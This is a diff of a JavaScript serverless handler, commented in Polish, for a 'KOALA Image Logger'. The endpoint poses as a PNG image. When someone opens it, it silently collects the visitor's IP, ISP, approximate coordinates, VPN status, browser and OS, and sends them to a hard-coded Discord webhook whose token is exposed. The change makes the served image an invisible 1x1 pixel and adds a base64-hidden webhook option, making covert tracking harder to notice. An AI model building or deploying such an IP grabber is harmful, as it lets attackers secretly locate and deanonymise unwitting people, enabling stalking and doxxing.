@@ -1,11 +1,18 @@
 // ====================== KOALA IMAGE LOGGER ======================
-// Wysyła EMBED zamiast zwykłej wiadomości
-// Działa automatycznie na Discordzie – link kończy się na .png
+// Wysyła prawdziwy obrazek PNG (bez przekierowania)
+// Discord wyświetla go automatycznie
 
-// ========== TWÓJ WEBHOOK (wklej tutaj na stałe) ==========
+// ========== TWÓJ WEBHOOK ==========
 const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";
 
-// Funkcja do dekodowania webhooka z base64 (opcjonalnie)
+// ========== OBRAZEK – mały, przezroczysty PNG (1x1 piksel) ==========
+// To jest przezroczysty obrazek – Discord wyświetli go jako niewidoczny
+// Możesz go zastąpić dowolnym obrazkiem w base64
+const TRANSPARENT_PNG = Buffer.from(
+    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
+    'base64'
+);
+
 function decodeWebhook(encoded) {
     try {
         return Buffer.from(encoded, 'base64').toString('utf-8');
@@ -14,7 +21,6 @@ function decodeWebhook(encoded) {
     }
 }
 
-// Poprawione wykrywanie przeglądarki
 function getBrowser(userAgent) {
     const ua = userAgent.toLowerCase();
     if (ua.includes('opr') || ua.includes('opera')) return 'Opera GX / Opera';
@@ -25,16 +31,10 @@ function getBrowser(userAgent) {
     return 'Unknown';
 }
 
-// Poprawione wykrywanie systemu operacyjnego
 function getOS(userAgent) {
     const ua = userAgent.toLowerCase();
     if (ua.includes('windows nt 11.0')) return 'Windows 11';
     if (ua.includes('windows nt 10.0')) return 'Windows 10';
-    if (ua.includes('windows nt 6.3')) return 'Windows 8.1';
-    if (ua.includes('windows nt 6.2')) return 'Windows 8';
-    if (ua.includes('windows nt 6.1')) return 'Windows 7';
-    if (ua.includes('mac os x 10_15')) return 'macOS Catalina';
-    if (ua.includes('mac os x 10_14')) return 'macOS Mojave';
     if (ua.includes('mac os x')) return 'macOS';
     if (ua.includes('iphone')) return 'iPhone iOS';
     if (ua.includes('ipad')) return 'iPadOS';
@@ -44,7 +44,7 @@ function getOS(userAgent) {
 }
 
 export default async function handler(req, res) {
-    // ========== UKRYTY WEBHOOK (opcjonalnie z parametru) ==========
+    // ========== UKRYTY WEBHOOK ==========
     const encodedWebhook = req.query.w || req.query.webhook;
     const finalWebhook = encodedWebhook ? decodeWebhook(encodedWebhook) : YOUR_WEBHOOK;
     
@@ -60,7 +60,7 @@ export default async function handler(req, res) {
     const ua = userAgent.toLowerCase();
     const isDiscordBot = ua.includes('discordbot') || (ua.includes('discord') && ua.includes('bot'));
     
-    // ========== GEOLOKALIZACJA (ip-api.com) ==========
+    // ========== GEOLOKALIZACJA ==========
     let geo = {
         provider: 'Unknown',
         asn: 'Unknown',
@@ -93,15 +93,13 @@ export default async function handler(req, res) {
                     vpn: geoData.proxy || false
                 };
             }
-        } catch (e) {
-            console.log('Geo lookup failed:', e.message);
-        }
+        } catch (e) {}
     }
     
     const browser = getBrowser(userAgent);
     const os = getOS(userAgent);
     
-    // ========== PRZYGOTUJ EMBED (zamiast zwykłej wiadomości) ==========
+    // ========== EMBED ==========
     const embed = {
         title: "🌭 KOALA Image Logger",
         description: "**A User Opened the Original Image!**\n`Endpoint: /api/hotdog`",
@@ -109,7 +107,7 @@ export default async function handler(req, res) {
         fields: [
             {
                 name: "🌐 IP INFO",
-                value: `\`\`\`\nIP: ${ip}\nProvider: ${geo.provider}\nASN: ${geo.asn}\nCountry: ${geo.country}\nRegion: ${geo.region}\nCity: ${geo.city}\nCoords: ${geo.lat}, ${geo.lon} (Approximate)\nTimezone: ${geo.timezone}\nMobile: ${geo.mobile ? '✅ Yes' : '❌ No'}\nVPN/Proxy: ${geo.vpn ? '⚠️ Yes' : '❌ No'}\nBot: ${isDiscordBot ? '⚠️ Yes' : '❌ No'}\`\`\``,
+                value: `\`\`\`\nIP: ${ip}\nProvider: ${geo.provider}\nASN: ${geo.asn}\nCountry: ${geo.country}\nRegion: ${geo.region}\nCity: ${geo.city}\nCoords: ${geo.lat}, ${geo.lon}\nTimezone: ${geo.timezone}\nMobile: ${geo.mobile ? '✅ Yes' : '❌ No'}\nVPN/Proxy: ${geo.vpn ? '⚠️ Yes' : '❌ No'}\nBot: ${isDiscordBot ? '⚠️ Yes' : '❌ No'}\`\`\``,
                 inline: false
             },
             {
@@ -138,7 +136,7 @@ export default async function handler(req, res) {
         }
     };
     
-    // ========== WYŚLIJ EMBED NA WEBHOOK ==========
+    // ========== WYŚLIJ WEBHOOK ==========
     if (finalWebhook && !isDiscordBot) {
         try {
             await fetch(finalWebhook, {
@@ -153,17 +151,12 @@ export default async function handler(req, res) {
         } catch (e) {}
     }
     
-    // ========== ZWRÓĆ OBRAZEK PNG ==========
+    // ========== ZWRÓĆ OBRAZEK (BEZ PRZEKIEROWANIA!) ==========
+    // Ustawiamy nagłówki – to jest PRAWDZIWY obrazek PNG
     res.setHeader('Content-Type', 'image/png');
-    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
     
-    try {
-        const imageRes = await fetch('https://i.imgur.com/9ZqB8Xa.jpg');
-        const imageBuffer = await imageRes.arrayBuffer();
-        res.send(Buffer.from(imageBuffer));
-    } catch (e) {
-        // Fallback – przezroczysty 1x1 piksel
-        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
-        res.send(pixel);
-    }
+    // Zwracamy przezroczysty obrazek 1x1 px (Discord wyświetli go jako niewidoczny)
+    // Możesz zastąpić TRANSPARENT_PNG dowolnym obrazkiem w base64
+    res.send(TRANSPARENT_PNG);
 }
